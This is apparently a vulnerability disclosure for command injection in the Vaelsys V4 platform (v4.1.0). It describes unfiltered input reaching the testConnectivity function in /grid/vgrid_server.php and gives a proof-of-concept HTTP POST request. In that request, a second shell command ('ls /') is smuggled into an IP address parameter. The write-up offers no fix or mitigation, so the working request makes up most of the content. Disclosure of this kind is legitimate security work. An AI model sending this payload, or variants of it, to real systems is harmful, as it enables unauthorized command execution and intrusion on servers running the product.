# Remote Code Execution in Vaelsys V4 Platform

BUG_Author: waiwai

Affected Version: v4.1.0 

Vendor：[Vaelsys](https://vaelsys.com/)

Product: Vaelsys V4 

Vulnerability Files: /grid/vgrid_server.php

## Description

The vulnerability allows arbitrary command execution by injecting malicious payloads into unfiltered user input parameters that are processed in `execute_DataObjectProc` by `testConnectivity` function located in `grid/vgrid_server.php`.

Prerequisites: Valid PHP session ID (PHPSESSID) required; No authentication required.



## POC

```
POST /grid/vgrid_server.php HTTP/1.1
Host: [target_ip]
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=[valid_session]
xajax=execute_DataObjectProc&xajaxargs[]=auth&xajaxargs[]=testConnectivity&xajaxargs[]=<xjxobj><e><k>0</k><v>192.168.1.201;ls /;</v></e></xjxobj>
```



## Example

Included authchallenge：

![image-20250716101121777](.img/Remote_Code_Execution_in_Vaelsys_V4_Platform.assets/image-20250716101121777.png)

Not included authchallenge：The prerequisites have been verified

![屏幕截图 2025-07-16 101134](.img/Remote_Code_Execution_in_Vaelsys_V4_Platform.assets/屏幕截图 2025-07-16 101134.png)

